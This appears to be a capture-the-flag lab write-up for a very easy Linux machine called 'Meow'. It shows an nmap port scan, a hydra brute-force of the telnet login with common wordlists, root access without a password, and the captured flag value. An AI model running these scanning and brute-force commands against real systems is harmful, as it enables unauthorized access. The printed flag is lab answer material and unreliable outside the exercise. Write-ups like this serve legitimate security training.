System: Linux
Difficulty: Very Easy

IP Address: 10.129.99.149

# System Flag

Ports are enumerated.
```
kali@kali:~$ sudo nmap 10.129.99.149 -p- -v
```

Only Port 23/TCP Telnet was returned.
```
<SNIP>
PORT   STATE SERVICE
23/tcp open  telnet

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 21.32 seconds
           Raw packets sent: 65674 (2.890MB) | Rcvd: 65536 (2.621MB)
```

Telnet connection is attempted.
```
kali@kali:~$ telnet 10.129.99.149 23
```

A login prompt is returned.
```
Trying 10.129.99.149...
Connected to 10.129.99.149.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login:
```

Since the credentials remain unknown, brute forcing will be used to find them.
```
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-20.txt telnet://10.129.99.149
```

Various successful logins are returned, meaning successful no-password login with the `root` user.
```
[23][telnet] host: 10.129.99.149   login: root   password: monkey
[23][telnet] host: 10.129.99.149   login: root   password: iloveyou
[23][telnet] host: 10.129.99.149   login: root   password: princess
[23][telnet] host: 10.129.99.149   login: root   password: jessica
[23][telnet] host: 10.129.99.149   login: root   password: 123456
[23][telnet] host: 10.129.99.149   login: root   password: 12345
<SNIP>
```

The user flag has been successfully obtained.
```
root@Meow:~# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19
```